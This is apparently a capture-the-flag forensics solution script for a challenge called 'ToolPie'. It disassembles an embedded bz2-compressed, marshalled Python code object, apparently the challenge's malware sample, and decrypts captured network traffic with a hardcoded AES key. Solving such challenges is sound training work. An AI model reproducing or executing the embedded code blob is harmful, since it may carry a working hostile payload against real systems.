        self.compressed_data = b'BZh91AY&SY\x8d*w\x00\x00\n\xbb\x7f\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xee\xec\xe4\xec\xec\xc0?\xd9\xff\xfe\xf4"|\xf9`\r\xff\x1a\xb3\x03\xd1\xa0\x1e\xa9\x11\x07\xac\x9e\xef\x1e\xeez\xf5\xdb\xd9J\xde\xce\xa6K(\xe7\xd3\xe9\xcd\xa9\x93\rS@M\x134&\r\x11\x94xF\x11\xa6\x89\xb2\x99\xa6\x94\xf0\x1ai\xa1\xa6\x9a\x03AF\xd1\x1e\x9e\xa1\x9a\xa7\x89\xa6L\x84\xf5\x1ayC\xd44z\x993S h\r\x0f)\xe9\x03@\x03LG\xa9\xa0\x1a\x04DI\xe8\x19$\xf4\xc9\xe92a\xa3D\xc9\x9aL\x11\x81O\'\xa4\x9e\x935=M\xa4\xd0\xd1\xa6&F\x81\x93L\x86\x80\x00\x00\x06\x80\x00\x00\x00\x00\x00\x00\x00\x00\rM\t4\xd1\x80L\t\x91\x18\xa9\xe4\xc6\x94\xd8\xa7\xb5OS\xc9\xa4=#\xf54\xd4\x06j\x07\xa9\xeaz\x9a\x1e\xa1\xa0z\x86\x83M\x03jh\x00\x03A\xa6@\x1a\x00\x00\x03\xd4\x00\x1e\xa7\x944\x005=\x10\x93\x10\x9b@\x994\xc8\x99\xa3J\x1bM\x1ajyOF\xa6\x98\xcab\x0c\xd16\xa0m&\x8fH\xd3@44\x01\xa0\x00\r\x03@\x004\x19\x00\x00\x00\x004\x1a\x01U44\x00\x03@\xd0\x1a\x0044\xd0\x06@\x1a\x00\x004\xd0\x18\x98\x86@42d\x00h\x1ad\x00\x00\x00\x004h\x00\x00\x00`\x91$Bhh4`\x9a\x19\x04\xc3@\xa9\xedS\xf4S\xd2\x1b\xd4\xda&M&\xd2m#\xcai\xfa\x8c\x93e=@\x1e\x91\xa0z\x8cjh\xd1\xa6\x80\x00\xd0\x004\x1e\xa0\x01\xa0\x1a4i\xb54\xd3\x10\x1f\xdf\xcb\x98\x99\r\xa1\r\x8c`\xd86\x0cd\xe9\xc3\x06\x9bm6\xdbm\x1b\xf1"\xf0\xd2\xa7\xd5p,\x171gAcG]V\xcfvr\x9e\r\x9d=\x13?N\xfa\x8bw3l`\x0e\x1c\xda\xdc\xb0VU\xa0\xe7\x8df>$\x10\xb5\xf2+fu\xd6\xd5\xed\x9a\x9c|b\xb1\xc4\xd1P\xd0\x95\xf8\x10\xc0\xb8\xd2\x10\\ 9\x83UF#^H\x12\x12\x91\x98\x9c\x1d\x89BQ\x8eC\x92\x066\x8bDp\x8a\xaa\x03e%\xad\xc4\xe5o\x8f\x01\xa0\x11\x84\xac\xb8H\x01^\xb7\x84y\xed\x0cU\xb37\xd7[w\xddm\xf4\xf9\xdb\xee7\xa6\x98\xe2-A\xea\x1c\xd6\xbe\xbf1\xe2\x03\x89A:2\xb0n\x0b\xc169\x8a\xab\n\\\xa4\xa0\xbb{ \x11\xa7\x1e-\xbc,P`F\xad\x08\xe1\x8dY\x9b\x02,\x8cs#eg%\x97\x071\xda\xe8XA|>\xa1\xae\xaah%\xc4]\x95w*4i[\x85\xee\xee=\xcf\x935q\x02uo"\xaf\x81/\xc0\xca\xbdF;\xf6\xef\xaa\x99A/ \x91\xef\x0b\xe1\xd9\xa4`w\x9e\xc6\x88\xf2\xa9S\xe3\xa6x\xaf|\x0b*IE\x02\x8a(NL\x00]?\x12\x10p=w\xc6\x92G\x8a\xd2\xff\x17}~y3\xe3\xe9f\xf1\xff\xaf\xf2\xa5\xb9\xa5\xcc\xfd;W\xdd\x1e\xcd\x9e\x0bD5\x0b\x0f\xc6wFW\\\xd5\x8d Gh\xc1\n|x2\x99&\x8e\\\xa5Ba\x7f6!\x10\xe4\xd0p\x18\x90\x97k4\x1a\xec@\x1b~~\x8d\xfe\xee\x96\x07\x8f\xd6\xe1SS\xcdOv\x8c\x89\xd2I\x150\xa5\xdd\xaa>E\x07\xdb\xf8l\x97V\xa0\x1c\x8d\xd9\xa50\x17[h\xd1\x02\x08!f\xad\xea\xa0"\x88\xceC\x0c\x0fVG^\xc0\xea_\x10\xbd\xa1m{5IL\xbb\xd2\x9an\x07\xd9a\x98jgIwr&&\x06\x0c\x8aH\xe73\xdd\xb1\x050\x9f\x1f\x1f\xe1J\'\x9d\x8cY\xa8\x11\x0b\x08\x0fd*\xf2\x9d\xc2\x84$\x10\x8a\xd9\xc1\xe05\xecs\xdeC\x9a\xd1\xb7\x85\x0eNiJj2\x9ag\x12\x94M)\xd2\r\xf3\xa8\x84\xc9\xc2\x06\xe1\x14\xda\xd1\x1e\x1bV\x1a\x0b\xe666\xc6~V\x81/r\x98\x95\xf2g\xc7Mm<\xed\xb0\xe9ko\x01\xcb4\x88\x17\x84\x8a"J\x9bJ\x18\x0ch;\x84\tv\xcb\xbaEL\x99\xdf\xaa)q/t:45\xba\xbf\x84V\xf5\xb3\xad\x8c\xee\x11\xe2(\x18>\xea3\xa9\x98\xa8B\xcf\xb5\xdc\xed\xacI<\x90\x06\x1d0)Y@\x86\x07\x7f\xee\xb9\xf5{m\xdf\x83Hf\xb3T\xd2\xdf\x9c\xc6\xab\xac\x13\x99\xcb\xec\xf5K\xf2\x80\xce\x9fC\xf4w\xeb\x1fa\x08\xd8\r\x80<%\x90w\x8b\xe8}\x8d\xda\x96\xcf)\x1a\xbaD.\xa3\xc2\xe5E\xe3\xc9p\xa8&w\x10\x14\xc6$v-I\xd9\xbd\xcf\xbf\xe1\xce\x19\xcdf\x07\x0b\x7f\xd7\xc8:\xa6nw\xfc=M\\n\xc7\x02\x96\n\x85".j\xa8G}\x04\xef\x1e+\xb0)4\x82G_\x05\xfe\xbe\x94\xf3\x03\xd4*\xe2\xf7T\xa8\x97\x97\xc3X\x8a\x9a;\x9a\xbei\xc9\xad\xd1\xd2\xcf\xde4fpz\xce\rY\xa5\xa2s\xad\xf8(S\xf3*\x85\xea$\x14\x18\xb6\x1a\xbb\xc5.O\xc3\xb7\x89\xeb9\x1a4\xd3\xe0\x999r\x99\x9a(\x84\xce\x17\x0bk\xa59\xd2X\x88\x815\xab\x10x\x9f\xb7\xc5\xe7_R\xaa\xaa\xab\xf2\x9e\xe1\xb9\x8aK\x91\xa3\xa1\xa7\xc0\x94\x8f3\xca\x82\x8azY\xc4g\xed\xcf\xa9BO:`\xb5\x1b2\x12\xbb\x89\x17[m\xa2\xe8\xc4\x0ctJ/-\xa5\xbf\xf1\xffq\x7f\xda\x9a\xd9\x00\xb2\x0b\x98L\x7f\x17\xb4\xc9g}\x1e\xfeSh \xc3\x98fIq\x05]\xb1\x8aB\x98\xc7\x94\x03=2&\x06v@s\x0fX\xb3\xadZ\xcf\xac\xf6\xae\xe2\x0b\xaa\xe4\x99\xf3\xf5<\xd7\x81mu\x87\xb5\x97\xd2\xc3\xb4p\xb5\xad\xd9y\x15\xf2\x06,\xa7;\xe2\xe4\xcaH\xbf\xd5\x92@\xae\x0c\x91\xddD\x9by\xd5\xccj\x7f\xa9\x19\xad\xa3\x07\xbdI\x84\xa9|k/\x0f7=ji\x12\xba\xd4\xfaI\x8c\xa9\x94\n\x9b\xa43\x0e\xa6O\xd3\x8d\xf5\x83\x06\xd8\xaehhl\x05*;\xda\xaa\xd9he\xc8\x8f2!\x98\xd6-B\xa9\xcf\x9a\xb9_\xa4\xec\xda\x08<\xe3\r\xeem\x1el\xd8\xfc}3\xc4\xbal\xe5,P\xe4^\xae-\x97\x91j0\xec\xc8bB\x85\xd1.\xf5T\xa4\xf1\x83\x89\xc4-\\\x00\xf0\xbb\x1a\xd2\x89K\xb58\x96\xe2\x88\xdd<q\r\xbb0\xc4Ac\x95.v\x94\x08>\xca\x8b\xf5\xa1\xaf\x1fVH\x16\n\xfe+\x02\x9f\xe9\xa7VP\x1a\x03m\x01\xab\x0b\xf8\xd1&\xacq\xadg\x0f\xfc\x98N\x91XRQ\x88\xcf- 4K\x84q"\xec\xb2\x8c\xe6e\x86 \x9ff\x10\x83p\xc5\xc1C\xf4\x8c5\xda\xe5\x82)\xcf\n\xbfWZ\xc0\xd1\x9b`\xacFt\xba\xed\xaf#\xc8\xf8\x96\xe9=Zd\xa4h\xa3d>\xb2\xec\xac\x98\xe6%\xca\xb2r\xe2\xd7\xb5\x80\x8c\x1cb0\xadC\x8a\xdb\x1e\x1d\x9ek\xf0>\xcf\'7=\x9b\x19\xdee@\n\xaa\xac\xd2N%$\x91]\xa7\x13c\xe7\xce\x95\x96\x81Yh\nS\xd1\xdc\xb5\xe3d{\x13\xc5\xeau22\xcc\xec\xe1\x19\xb6\n\x8e?\n\x01\xdey\x04t\x02"@\x82\x12J\x88\x86\x1b\x83Un\x03Uy\xed\x82\xc3\x19\xdd\x86\r\xda\x1a\xde\x7f\x14\x90\xb3\xaf?\x05\xd3\xf0\x05\xe9\x85\x83\x99m\x8ae\x86\xd59Zl\x83i\x04u<\x92]\xe9\xca\xbc\xf5k\xcd\x8e,\xc1\xfcU\xc7\x84%|>\xfbt\x9c\x04\xf0}\xceQ|Wy\x9eN\xa8\x19#\x12\x94\xf1\xfdX5`\x19\x0e\x87NwC\xa5\x80p\xb1\xd9\xc73F\xe8\xa5\x9c\x00\xe5\xb1)\xd3]\xa6\r\x9d\x1a\xdd\xa4\x91\xb9z}\x1bg\x12\x9e<\nB\x88\x0e\xdf:\x1c\t\xc3\xa3\x85\x1b\x98y\xec\x0c\x9a\x12Pr\xcdC\xea1\x7f\x01\xef\xc3\xb0\xdd16\xe7\x1e\xf7\x1fv4\x17\r\xd3\x86\xceE@\xce\x15T\xce\x00\xf3@\xd9\r\x05\x19@V\x1c"\x86\xa6\x9c&,\x05\xa6%\x02n(^9\x86\xa65#\xc8\xb5]\x88\x8e\xa2,1\xc3u2\xe0\xa8 \x01\xff"|\xffG\x0b6\xbeU\x8a\xf7;YD\xda\xb4u)l\xf6~\'\x0e\x9b\xb3/\x98Q1\x04\x12JI[\x11*\x81\t\x07\xcb\xadw\xc9\xbf\xbf\xbe\xbaa\xc6\xce\x9e)\x98v\x15\x01j\xa15\xbd\xd0\xcb.\xe3\xd7\xa2`\x15\x9e\x854\xd3\x1am\r\x13A\x9a\xa5\x0b\r\x81\r\xb9\xb3%)Bmr\x12L\r>\x87\x07K\xea\xden\x87\x01c6%\xea\xa5\xd8\xb54\xc0\xca\xb8SBd{O\x9c \x88\x86\xee-80\x81Vv\x08[P\xc221\x9e &,t\x11/9\xe0\xd0\x1f\x1d\xcd\x94\xb9\x95\xc7V\xcb\xd6\xf2M\xf7\xf4gT\xa2\x19\x94\xd9\xfb\x7f\x15\x90\xc5\xb2&\x9e}\x0cq\xe8\xdc(\x1a{l\\\x88\xb8\xab=\x8b\xaaCm\xc0\xcb\xb5w=\xf8\xff\xa3\xdfY\x94\xa5\xa5\x9d0\x04U\x8al\xb8iw\xa3\xb0%\xf1 \x03H\x80\xc9$v\xe6\x98|#DYP\xa4\xfe\'\x04\xe0&\x88+\xeb\xce:\xa0cm,\x1aQ\xfdN\x1c\x97\xa3\x98\xb5q\x1c\xefE\xabEC\xaa\x82\x00\x8c\xcb\xee\x8d\xd6l\xe5\\\xca;\xf9d\xd4\xa5\xaen\xfaW=\x88kU9\xfe\x95&c\x13\x0cL7+5\xe2\xde_\x9f\xf6t\x05Hn\xe2\xff\x9dzi\x9a\x03@`u\xea\x98\xb5\x8e\xd9\xa3W\x85\x96O\x85\x9bf\xc1\xb6\xa4x\xa2/=\x0f\xa6T\xde\xac\xc6\x84\\\xa5q \x8eZ\xd5p*-qC%\xec\x85aH\x90>\xc1\x97%B@\x12B"u\xd5R\x0f\x10`&\x9ai\x1cl*F\xefOr\xaee\xaf\xa9\x88q\xa2k93\xe6\xf6\xf5\xa8n\xd0\xf42\xe5<\xf7}\xad\xdc\xd4)L\x11\x97\xd4\x92\x11E\xe1\xa0\xa4\xe4{\x9a\xe6T\xda \xee\x83\xb7\xce\x17\xb0\xb3\x0c\x11\x8f\xc1t\x0c\xb5\x87\x9e\xbb\x0f\x0fql\xe8T\xc5\x02+E\xdd\xbcQ\x92\xb8\xb8\xc8*,(K\tUk\x16\t\x86\xb9@\'\x04\xc1l&\xcf)\x1f\x14V\x0b\x80\xd2\r\xab\xec\x07) \x0c\x0f\x80\xee\x16\x14\xf9\x9c\xcbKE\xed`;5\xa9\xc2\x105X[\x87\xd6j\x95\x18\xcaY\x99\xba\xe6\xe8\x04q\x8344\xceW\x00\x05\xc4\x15\xfb\x82\xea9\xfcJ\xa3L\x8e\n\xc1\xb4\xb3sY\x84`\x98\x99\xccy\x0f{\x02P\x8e\n\xb3\xe5\xeclN\xa8\xb5]\x84!I\x80\xa4\x8at&\xe4eu\xba\x15T\x1fv\x90fx\x81P9\x1a\xf5G\xa9\xa2\x9c\xed\xc4W\xa0\xbb\xa5j\x1e\x1b\xd9%J\xb3z1I`\x19s\xd9\xb0\\\xca\xfdd\xd54!\x829\xc2|\x0c\xed\xdb\x0e\xde:\xcb%l-\xf6\x8f\xef\xde\xe2\xa5h\xb6e\xc5\xc7!\xc6 @B\x97.\xc2,~\xf8\x8a\x14\x94\xeb\x8emR\xf8\xfb\xa5"Qd\xc0\xe6\x81\xbe\x9fc=s\xd6,V\xca\xb1\x80!U\x8c\x82"\xddme\xbc=\xf9\x1b\xfc\x8d\xe6+\xc3\xc8:y\xe2\xfcZ\x1c\x88\x9f{\xdbZK\xb0#,\xb8\x9f\x10\xe1\x03\xb0H\x7f\x89w\xee\xd7\x9dvx\xafo\x98vge%\xdc"\xd1\x0f\x9dQ?\x83N\xe3\xb4\x14j%|C\x08\xb0\x16K\xc1H\x9d\xf8\xbc\xf4\xae\xa7\x8aA\xd0\xbfCM\x85w\x82)c\xcc\xd4\xcaV\xc52j\x14ObB&\xe7NQ\x9e\'93M\x8f`!\xcc\x80#%\x04\xd2\xeb"T\xbe\x8d0\x04\xa5\xad\xa3\xab\xf6\xd5\x86\xe214\xb1\xa6\x12\xa6*t\x94Q\x0c!\xc1\xe0#\x18\x8a\x81\xe4\x12A\xccK\xc6\xa3\xa9\xd0kh\xbb\x11m\xd7\\\xe6\xe8wr\x990\xc0\x83\x85\rC\x9d\xc8\xc7\xfcv\xf8Y/\x93\xc30NFe\xc2\xf7s\x91\xb7B\xa6\x10bb\x11\x18\xb0\x19\xf4\xa1X\xb9\x92\xb3\xdc+\x962\x9c\x0bt\xd9l,&\xe8\x1f\x0b\xfe\xf4\xb7\xcd\x0e\x11\xc9#Z\xb0\x90d2]\x06\x89\xcd\t\\\xa3\t\xad\x8d\x9b\xe5Z\xd0\xa6\xa73q{>_\xd7\xdd\xe21\x83\xa2k\x04DO\xc0Ag;Z\x99;\xdf\x14\x9e<\xe3v\x1d\x99\x8b\x9a\x98d\xe6\x05\xcd)\x94\xc2\x9b:F \xcdG\xdeP\x869\xdd)kg\xd2\xde*\x1a\x9c\x04\x10\x12z\xda4\x8d,\xcb\xec\xcbR\x99\x0f\x9c\x81\x08\xearz\xe5R\x17\'Y.=\x9el\xe9\xc4\xeew0\x08\x06\xc0g/m\xe0\xf04\x1c\x0c\xfcN\xc0Q\xaa\xbf\xc5\xe8\xa0y5\x88\x83\xdet\xa3\xce!e"\\\x13F\xeeo\xf7]\xcd\xa0t\x01F[h\xad\xa0a\xd7\x02\xda5\xcdo\xa9>\xf0\x88P\x9dM\xb3A\xc8\x92\xd6\x8b\x1b.\x8b\x8f\x9b\x8c\xda\x9cQ\xa1o\x14\xeb\'\xeb\x9f?\xf1\xd5\x87P\x0c\xb6g*\x1bqX\x93P=@\x1c\x0b\xab\xec\t\x1dq\xa9\x94\x16\x10u\x0ez\xc7\x9eG*\x12\x06K\xf5\xb8\x1ca\xe7 \x1a\xf0\xb5\xa8\x879\x86\x18\xe2\xb0\x96\xc1]~`ac[\xc2\xde\x83\xa5G2@[2\x96\xc5f\x7f\x17\xa7\n\x1b\x9cU\x06\x07;`\x96\xa31\t\xe8\x94t\xc0\xbdzW\xaeW\xb3^\xf4\x9e\xf6\x834\x0c\xb2"\x8e\x94\xda\xafp\xa4%N\x93\x045C\xa1`A\x02\xc1-h\x80\x8d\xb6\xc9d\xc5\xde\x98-\xa2\xbf\xafB\x8c\xd2\x9a\xbe\x98,\xc4\xfd\x93(V\xd1j\xd3\x1cA\xb5\xae\x7f\xae\x8e\x9c\xb0)\x8b5\x96\x0c\xffR\x9e\r\t\xae24\xf6\xf6\xfb\x85=\xc7\x8dd\xc8O1\xcb\xce\xb2*\x98\x1d\xb5LW\xaft\xcb\xcb\xbe)\xfc\xc0L\xacJ\x03\x95\x1b\x85\x94\xd0^\xe2uv/\x00\x10\r\'\x1e\xc7\xb5\xfd\xe7\xe6\xaf\x03\xa6\'\x88U\xab\xd9\xa85\x8a\xca\xd4\x84o\xb0\x83\xc4\xb9\x1a\xf4\x8c\xc0\xb9T\xae\x86\xa2cP[\x80D\x1a\x91z\xca\xb0\x83`4\x84\x8aM\';r\x91d%\x99\x89\xa7\x10Xp\xc8\x96\\\x82[\xe8\x9b\x01\xc0\xdd\x07\r\x10\xc7\x85\x83R\x04Tc\x1e\x99<)\xc9\x98`\x16\x9c\x82bl\xac\xa9I\xedh+P\xcc\xa7l\xb17\x97S\x1b\x83W\xbe\xa5|\x083ZJ\x80\xec\xcfm\xc8\xd9\x8b\x1a!\xbf\x0c\x14\x12<{f\xa2\xa0\x05u\xb2\xf9\xf2\x9a\xde\x95r\xa0\xf5>"\'\xe9\xe8\xae\x12\x1a\x12\x92Q\x11\x91\xa8"\xe2\xbf0\xb2\xe5Z\x88D\xe6\x01\x88#\xd3\xaa\xabV}\xbd\xd6Kh\x1aOG\x96*\xa0\xd7\xad\xd8\\h\xc3U\x80\x7f\xa0\xb3\x04\x86\x0f\xa4\xb2\xb5\xfb*VV\xa5\xab\xc5 \xba(U*\x1e8\xa7\xa1R\x17\xb5H\xcbh\xf8\x1d}\xf5I\xa7UY\xca8#\xf6k!&|>\x13(<\xb3\xcf;#\x8b\x11\x8e\x9f\x07I\x03 \x13\xf8\xde:\xceW\xc0,V\xc0X@\xd0\x02\x04bT+\xc3\xd0\x14uu\xeb\xbbE\xa4X\xef\xed\x1c(\x9a\xcc\xf9n+\xf0\xe0f\x9fv/v6\xed\xd2\xc6/\xca^\xd0\x8bt\xe9&\xdc\t\x93\x80\x8a\xa4F\xa6xn`\xb7\x9d\x86\xc7c\xa0Y1\xe6\x89\x92\x08h\x8b\xf8)8?\x13\n\xe6<\xd8\xea5\xec\x80\x01b\xc6\\\xbe\x90\x07\xc8.a\xca\xca\x91\xd8hQ\xb1\xc4\xf9\xf2\x1a\x95\x8c\xe1h0\r+\xb0:\xd4\x02$!PC\x83P\xe4L\x99\xb9\x16q\xd4\xa1\x98\rJ0\x97\xd7\xdb3|\x80\x81\xe8\xe1.\x00@\xa8\xca\xc7\xd5\xfcK\xc9\xaa\xc6\xec\xc7\x97\xbc\x99\xb6m\xf1\x87\x9aM\xbdO\xd3?\xbc\x97\x93\xaflr\x9c=\x8f\xce\xfe\xd4*\x03\x92?*T\x18<\x85\xc2+\x04\xc3@\x04\xf5\xf3\xc0ji#\xe4p\x18\xb5\xcd\x1f`b\x83\x99\xa3\xfc\x00?\x8fK\xbc\xa6g\xd9\x00\xd2v\xdf\x97+\xd3\x961\xa8zm\xe5\x9bP\x04\xf2L&? \xc0`\xb4\x00\xca\xf0a\xbe9C\x80b\x87E\x83\xceh\xf93t}[\x1f\x9a&\xfa\x0c\x1a`\xe5\xcc?e\xdb\x06\xe3<\xf7IGH\x9c]%hp\xec?$\x19\xb9O\xd1)\xb9\xb2\x0c\xb7\x03ZGX\xe3\x92\x08\xd2\xc9VBp,\xb7\xec\x943\x8a\xd2\x1f5A@HQ\x9d \x80\xa3p8\xf1\xa2M\x07|\x95n\xe3\x92k\xf9\xb5\xd0 \xa7\xc0\x85/\xfcC]\x04<\xd5\n5\x87\x11\x17\xe4o@\x9b*\xc0\n\xc3NkOh\xf8n \nj?\x9f=\xf5}\x06\x15h\x977A]\x0b\xb8\x94\xbe\xb0\xd7\xbe\xba\x8e\xb7\xafn\xa6\x9f#\x08?5\xde\xddm?\xec\xc6\xaa3\xd6jV\x0b.\xeam\xab\x94`\x95O\x13\x188\xc6\xc8I$9\x83\x7fil\xf2\xf9\x17\x19h\x93*\xbfk\xb2\xea#\xad\xbf\xcb\xe5{C\x15\xcef^\xca\x88\x99Wya\xac\x8c\xdb\x11\x16\xd9\x07\x05y\xe5C\xb4,\xc2\xc3\xcdP\xd2\xec\xe4\xceT$\xaa*\xa1&[[\x8d\xb7\xc5\x9b\xc3C\xba)_F\xba\xbd\xac<N7)g\x9f\xc1\xd8p\xab\'\xd9#K\x966z\xfc\x9d\xeb\xd7w\xb7\xd0\x89\xa4\xb9 \x88\x88\x846\xb5\xa1\x84J\xce\xa2\x0b\xe877\xf7\xf3\x17\x0c\xd3\xd0)\xe3\x07\xdcvm\xa0#\x96\xffx\xaa\xe6E_\x07aO\xefj\xba\xe3c\x9b\xdel$\x83h\x9e\tL\x1f\xa0}%"p\x9c\xd4\xd1\x9e\x8e\xfdf]\t\xac#\xbf\x15\x9c<\xf3-\xc2Zj\x99\xae\xc8.\xb3\x9d5\xfa\xe2\xae\xea\xba\xf4\xc63\x04Ot\xf9\x12\xd1{nMJB\x1b,\xbc\xbek\xa0\xca\xa6\xa5\x93/\x0f\xa1)Y\xb4v2L3\xa5\x8d\x0cq(\x0f\x18\x10\x82P-"\xe5\xe1\xe8\xb3\xa3SxJ\xcc\x0c\xdc\xae-n\xf7}w\x19\xae.\xcbi\\b\xdf0[\x10\xe9\x1a2xVZK\xd0S\x88\xd2c&+\xf7\x83Oj\x9d\xab\xb7Uh"z\x97\xf0\x9d\xa7\x92\xd6[(w\x0e)\xc8\xffM|\xa3j\xa15\xc7\x04\xe4Z\xd8\xa2\x88\x08\r\xea\x90J\xbaM\x01\xb0\xd2uQ\xc0\xa1\xcd\\\xadV\xe2\xf3.\x0bl\xe8\xa9^$\xc9\x95\xf6T\x13W\x18\x824\x016\xc8%,\x08\xbe\n\xa2\xd5AB\xdd5[=m7:\x06\xa0\x80\x86\x04\xb5\xe5E\x83K>qyY\x94S\xb8\xd80\xd6[\xc2\x84k\x0b\xdb\xec\x15\xb6\xcf-\'\xf0e@f\xa9Q6U\xcbi\x13N\xbas]3Q\xb1\x8diFP\xbb!P\xff\xd2\x82n\x98\x9dH^\xd6k\xd3\x8e%\xe0k\xca\x9b\xd4\xff\x90\xba-Q\x15\xa5\xd3\x14O\xe0\x12\x06]"\xb2\xa8\x82\xac`\'L\x98\xbd\xbcb;\xad\x13T\x95\x15o\x1a!\x89\xc3\xadN|z\x9bv\xf9\x98\x14\xca\xff\xe2\xeeH\xa7\n\x12\x11\xa5N\xe0\x00'

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def demarshalling(self):
        """
        Description:
            This function is used to demarshall the compressed data and display the disassembled code.
            Challenge specific function
        """
        self.load_compressed_data()
        data = bz2.decompress(self.compressed_data)
        code = marshal.loads(data)

        print(dis.dis(code))

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def dec_file_mes(self, mes, key):
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())

        return unpad(cypher.decrypt(mes), 16)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def unified_extract_packets(self, pcap_file, pcap_function: str, raw: bool = False):
        """
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]

        Returns:
            dict: Dictionary of packets
        """

        packets = None
        # Dictionary to hold packets
        packets_dict = {}

        if pcap_function == "scapy":
            packets = rdpcap(pcap_file.as_posix())
        elif pcap_function == "pyshark":
            packets = pyshark.FileCapture(pcap_file.as_posix())

        if raw:
            return packets

        for i, packet in enumerate(packets):
            packets_dict[i + 1] = packet

        return packets_dict

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def smart_extract_packets(
        self,
        pcap_file,
        pcap_function: str,
        raw: bool = False,
        save: bool = False,
        filename_save: str = "packets.pickle",
        folder_save: str = "data",
    ):
        """
        Description:
            Extracts the packets from the pcap file and saves them as a dictionary.
            If the file already exists, it loads the file.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]
            raw (bool, optional): Option to return the raw packets. Defaults to False.
            save (bool, optional): Option to load saved file . Defaults to False.
            filename_save (str, optional): Filename to save the packets if enabled. Defaults to "packets.pickle".
            folder_save (str, optional): Folder to save the filename if save is enabled. Defaults to "data".
        """

        file_path = None

        if save:
            file_path = self.folfil(folder_save, filename_save)

        if file_path is None or file_path.exists() is False:
            # Read the pcap file
            print(f"Extracting packets using {pcap_function}")
            packets = self.unified_extract_packets(pcap_file, pcap_function, raw=raw)

            # Save the packets
            if save:
                self.pickle_save_data(
                    packets, filename=filename_save, folder=folder_save
                )
        else:
            print(f"Loading packets from {filename_save}")
            packets = self.pickle_load_data(file_path)
        return packets

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def custom_stream_extract(self, stream_num=None):
        """
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            stream_num (int): Stream number to extract

        Returns:
            dict: Dictionary of packets
        """

        packets_scapy = self.smart_extract_packets(
            self.challenge_file,
            pcap_function="scapy",
            save=True,
            filename_save="packets_scapy.pickle",
        )

        packets_pyshark = self.smart_extract_packets(
            self.challenge_file,
            pcap_function="pyshark",
            save=True,
            filename_save="packets_pyshark.pickle",
        )

        packet_dict = {}
        for i, packet in packets_pyshark.items():
            if hasattr(packet.tcp, "stream") and int(packet.tcp.stream) == stream_num:
                packet_dict[i] = packets_scapy[i]
        return packet_dict

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def get_scapy_tcp_stream(self, nunber: int):
        """
        Unused , but could be useful in the future
        """
        packets = self.smart_extract_packets(
            self.challenge_file,
            pcap_function="scapy",
            raw=True,
            save=True,
            filename_save="packets_scapy_raw.pickle",
        )
        stream = packets.sessions()
        return stream

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def decrypting_stream_4(self):
        """
        Description:
            Challenge specific function
        """

        stream_4 = self.custom_stream_extract(stream_num=4)

        # print(list(stream_4.keys())[0])
        # # print(stream_4[list(stream_4.keys())[0]].show())

        

        start = 94
        end = 997
        encrypted_data = b""

        for i, packet in stream_4.items():
            if (
                i < start
                or i > end
                or hasattr(packet, "load") is False
                or packet[IP].src != "172.31.47.152"
            ):
                continue

            encrypted_data += packet.load

        try:
            decrypted_data = self.dec_file_mes(encrypted_data, self.encryption_key)
            print(f"Packet {i} :")
            with open(self.folfil("data", "decrypted_data"), "wb") as f:
                f.write(decrypted_data)
            print(decrypted_data)
        except Exception as e:
            print(f"packet {i} : {e}")

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def saving_stream_4_encrypted_bytes(self):
        """
        Description:
            Challenge specific function
        """

        stream_4 = self.custom_stream_extract(stream_num=4)

        start = 94
        end = 996

        # print(list(stream_4.keys())[0])
        # # print(stream_4[list(stream_4.keys())[0]].show())

        encrypted_load_file_path = self.folfil("data", "encrypted_load.txt")

        for i, packet in stream_4.items():
            if i < start or i > end:
                continue

            if hasattr(packet, "load") is False:
                continue

            try:
                with open(encrypted_load_file_path, "ab") as f:
                    f.write(packet.load)
                # decrypted_data = self.dec_file_mes(packet.load, self.encryption_key)
            except Exception as e:
                print(f"packet {i} : {e}")

        decrypted_data = self.dec_file_mes(packet.load, self.encryption_key)
        print(f"decrypted :")
        print(decrypted_data)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def decrypting_packet(self):
        """
        Description:
            Challenge specific function
        """
        # packet_data_path = self.folfil("data", "packet_1.data")

        ending_number = 94
        packet_path = self.folfil("data", "packets")

        for num in range(94, ending_number + 1):

            packet_data_path = self.Path(packet_path, f"packet_{num}.data")

            with open(packet_data_path, "rb") as f:
                packet_data = f.read()

            decrypted_data = self.dec_file_mes(packet_data, self.encryption_key)
            print(f"Packet {num} :")
            print(decrypted_data)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def main(self):
        # self.demarshalling()
        self.decrypting_stream_4()

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.encryption_key = "5UUfizsRsP7oOCAq"

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pickle_save_data(self, data: any, filename: str, folder: str = "data") -> None:
        """
        Description:
            Save data to a pickle file

        Args:
            data (any): data to write to the pickle file. Can be anything
            filename (str): Filename to save
            folder (str, optional): Folder name inside the ctf folder. Defaults to "data".

        Returns:
            None
        """
        with open(self.folfil(folder, filename), "wb") as f:
            pickle.dump(data, f)

	# /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pickle_load_data(self, filename: str, folder: str = "data") -> any:
        """
        Description:
            Load data from a pickle file

        Args:
            filename (str): Filename to load the data from
            folder (str, optional): Folder name to find the file to load the data from. Defaults to "data".

        Returns:
            any: Data loaded from pickle
        """
        with open(self.folfil(folder, filename), "rb") as f:
            return pickle.load(f)

